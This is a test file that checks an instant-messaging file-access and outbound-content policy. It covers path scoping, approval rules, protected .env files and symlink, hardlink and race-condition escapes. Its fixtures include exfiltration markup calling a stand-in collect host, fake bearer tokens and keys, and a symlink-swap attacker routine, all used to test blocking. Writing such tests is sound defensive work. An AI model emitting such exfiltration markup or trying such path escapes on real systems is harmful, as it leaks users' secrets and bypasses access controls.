import { describe, expect, it } from "vitest";
import { inspectImOutbound, requireImScope } from "../src/main/im-policy.js";
import {
  authorizeImPath,
  authorizeImReadPath,
  readImFile,
  writeImFile,
  imProjectedDirectory,
  imRequiresApproval,
} from "../src/main/im-policy.js";
import {
  mkdtemp,
  mkdir,
  writeFile,
  readFile,
  link,
  symlink,
  rm,
  rename,
  unlink,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

describe("IM policy", () => {
  it("projects only authorized names for scoped navigation without granting ancestor reads or writes", () => {
    const whole = { audience: "owner", readPaths: [], writePaths: [] };
    expect(authorizeImReadPath(whole, ".")).toBe(".");
    const scoped = {
      ...whole,
      readPaths: ["src/public", "docs/guide.md"],
      filePaths: ["docs/guide.md"],
    };
    expect(authorizeImReadPath(scoped, ".")).toBe(".");
    expect(authorizeImReadPath(scoped, "docs")).toBe("docs");
    expect(imProjectedDirectory(scoped, ".")).toEqual([
      { path: "docs", directory: true },
      { path: "src", directory: true },
    ]);
    expect(imProjectedDirectory(scoped, "docs")).toEqual([
      { path: "docs/guide.md", directory: false },
    ]);
    expect(imProjectedDirectory(scoped, "src/public")).toBeUndefined();
    expect(() => authorizeImPath(scoped, "docs")).toThrow();
    expect(() => authorizeImPath(scoped, "docs", true)).toThrow();
    expect(() => authorizeImReadPath(scoped, "src/private")).toThrow();
    for (const path of ["", "..", "./src", "/tmp", "src/.."])
      expect(() => authorizeImReadPath(whole, path)).toThrow();
    expect(() => authorizeImPath(whole, ".", true)).toThrow();
    expect(() => authorizeImPath(whole, ".")).toThrow();
  });
  it("does not ask again for collaboration queries or waits, but preserves strict approval for dispatch and writes", () => {
    for (const action of ["participants", "status", "wait", "cancel"] as const)
      expect(
        imRequiresApproval("ask", {
          action: "collaborate",
          command: { action, text: "" },
        }),
      ).toBe(false);
    expect(
      imRequiresApproval("ask", {
        action: "collaborate",
        command: { action: "delegate", participantId: "peer", text: "work" },
      }),
    ).toBe(true);
    expect(
      imRequiresApproval("ask", {
        action: "write",
        path: "src/x",
        content: "x",
      }),
    ).toBe(true);
    expect(
      imRequiresApproval("automatic", {
        action: "write",
        path: "src/x",
        content: "x",
      }),
    ).toBe(false);
  });
  it("fails closed on legacy grants", () => {
    expect(() => requireImScope({} as never, "owner")).toThrow(/确认/u);
  });
  it("allows discussion and placeholders", () => {
    expect(
      inspectImOutbound(
        'Discuss password validation. const token = "test-token"; API_KEY=your-api-key',
      ),
    ).toBeUndefined();
  });
  it.each([
    "-----BEGIN PRIVATE KEY-----\nsecret",
    "Authorization: Bearer " + "a".repeat(30),
    "api_key=sk-" + "a".repeat(30),
    "![chart](https://example.test/collect?data=secret)",
    '<img src="https://example.test/collect">',
    "[report](https://example.test/?token=realcredentialvalue)",
  ])("holds credentials and exfiltration markup", (text) => {
    expect(inspectImOutbound(text)).toBeDefined();
  });
  it("checks invisible characters without altering the original", () => {
    expect(
      inspectImOutbound("Author\u200bization: Bearer " + "a".repeat(30)),
    ).toBeDefined();
  });
  it("does not expand a file grant when its path becomes a directory", () => {
    expect(() =>
      authorizeImPath(
        {
          audience: "owner",
          readPaths: ["readme"],
          writePaths: [],
          filePaths: ["readme"],
        },
        "readme/private.txt",
      ),
    ).toThrow(/文件/);
  });
  it("reads the whole project with empty readPaths but never writes by default", async () => {
    const root = await mkdtemp(join(tmpdir(), "im-universe-scope-"));
    const scope = {
      audience: "owner",
      readPaths: [],
      writePaths: [],
    };
    try {
      await mkdir(join(root, "docs"), { recursive: true });
      await mkdir(join(root, "src"), { recursive: true });
      await writeFile(join(root, "docs", "guide.txt"), "WHOLE_PROJECT");
      await writeFile(join(root, "src", ".env"), "PROTECTED_SENTINEL");
      expect(authorizeImPath(scope, "any/nested/file.txt")).toBe(
        "any/nested/file.txt",
      );
      expect(
        authorizeImPath({ ...scope, writePaths: ["src"] }, "src/out.txt", true),
      ).toBe("src/out.txt");
      expect(() => authorizeImPath(scope, "src/out.txt", true)).toThrow(/范围/);
      expect(() => authorizeImPath(scope, "src/.env")).toThrow(/受保护/);
      expect((await readImFile(root, "docs/guide.txt", scope)).toString()).toBe(
        "WHOLE_PROJECT",
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
  it("enforces one file scope for reads, writes and publication bytes", async () => {
    const root = await mkdtemp(join(tmpdir(), "im-file-policy-"));
    const scope = {
      audience: "owner",
      readPaths: ["src", "docs"],
      writePaths: ["src"],
    };
    try {
      await mkdir(join(root, "src"));
      await mkdir(join(root, "docs"));
      await writeFile(join(root, "private.txt"), "PRIVATE_SENTINEL");
      await writeFile(join(root, "src", ".env"), "PROTECTED_SENTINEL");
      await writeFile(join(root, "docs", "guide.txt"), "read only");
      await symlink(join(root, "private.txt"), join(root, "src", "symbol.txt"));
      await link(join(root, "private.txt"), join(root, "src", "hard.txt"));
      for (const path of [
        "../private.txt",
        "private.txt",
        "src/.env",
        "src/symbol.txt",
        "src/hard.txt",
        "src/../private.txt",
        "src\\private.txt",
      ])
        await expect(readImFile(root, path, scope)).rejects.toThrow();
      for (const path of [
        "docs/guide.txt",
        "src/.env",
        "src/hard.txt",
        "src/symbol.txt",
      ])
        await expect(
          writeImFile(root, path, "overwrite", scope),
        ).rejects.toThrow();
      if (process.platform !== "darwin")
        await writeFile(join(root, "src", "new.txt"), "");
      await writeImFile(root, "src/new.txt", "accepted", scope);
      const frozen = await readImFile(root, "src/new.txt", scope);
      await writeFile(join(root, "src", "new.txt"), "replacement");
      expect(frozen.toString()).toBe("accepted");
      expect(await readFile(join(root, "private.txt"), "utf8")).toBe(
        "PRIVATE_SENTINEL",
      );
      await expect(readImFile(root, "src/new.txt", scope, 2)).rejects.toThrow(
        /limit/,
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
  it.runIf(process.platform === "darwin")(
    "does not follow an ancestor replaced during file access",
    async () => {
      const root = await mkdtemp(join(tmpdir(), "im-path-race-"));
      const workspace = join(root, "project");
      const outside = join(root, "outside");
      const source = join(workspace, "src");
      const held = join(workspace, "held");
      const scope = {
        audience: "owner",
        readPaths: ["src"],
        writePaths: ["src"],
      };
      try {
        await mkdir(source, { recursive: true });
        await mkdir(outside);
        await writeFile(join(source, "existing.txt"), "ALLOWED");
        await writeFile(join(outside, "existing.txt"), "PRIVATE_SENTINEL");
        const attacker = async () => {
          for (let i = 0; i < 100; i++) {
            await rename(source, held);
            await symlink(outside, source);
            await new Promise<void>((done) => setImmediate(done));
            await unlink(source);
            await rename(held, source);
          }
        };
        const access = async () => {
          for (let i = 0; i < 100; i++) {
            const bytes = await readImFile(
              workspace,
              "src/existing.txt",
              scope,
            ).catch(() => undefined);
            if (bytes)
              expect(["ALLOWED", "UPDATED"]).toContain(bytes.toString());
            await writeImFile(
              workspace,
              "src/existing.txt",
              "UPDATED",
              scope,
            ).catch(() => {});
            await writeImFile(workspace, "src/new.txt", "NEW", scope).catch(
              () => {},
            );
          }
        };
        await Promise.all([attacker(), access()]);
        expect(await readFile(join(outside, "existing.txt"), "utf8")).toBe(
          "PRIVATE_SENTINEL",
        );
        await expect(readFile(join(outside, "new.txt"))).rejects.toMatchObject({
          code: "ENOENT",
        });
      } finally {
        await rm(root, { recursive: true, force: true });
      }
    },
  );
});

it.runIf(process.platform === "darwin")(
  "rejects stale file content before truncation and supports absence preconditions",
  async () => {
    const { imContentHash } = await import("../src/main/im-policy.js");
    const root = await mkdtemp(join(tmpdir(), "im-write-conflict-"));
    const scope = {
      audience: "owner",
      readPaths: [],
      writePaths: [],
      writeMode: "project" as const,
    };
    try {
      await writeFile(join(root, "shared.txt"), "newer");
      await expect(
        writeImFile(
          root,
          "shared.txt",
          "stale edit",
          scope,
          undefined,
          imContentHash("older"),
        ),
      ).rejects.toThrow(/changed/i);
      await expect(
        writeImFile(root, "shared.txt", "replace", scope, undefined, "absent"),
      ).rejects.toThrow();
      expect(await readFile(join(root, "shared.txt"), "utf8")).toBe("newer");
      await writeImFile(
        root,
        "shared.txt",
        "merged",
        scope,
        undefined,
        imContentHash("newer"),
      );
      expect(await readFile(join(root, "shared.txt"), "utf8")).toBe("merged");
      await writeImFile(root, "new.txt", "created", scope, undefined, "absent");
      expect(await readFile(join(root, "new.txt"), "utf8")).toBe("created");
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  },
);
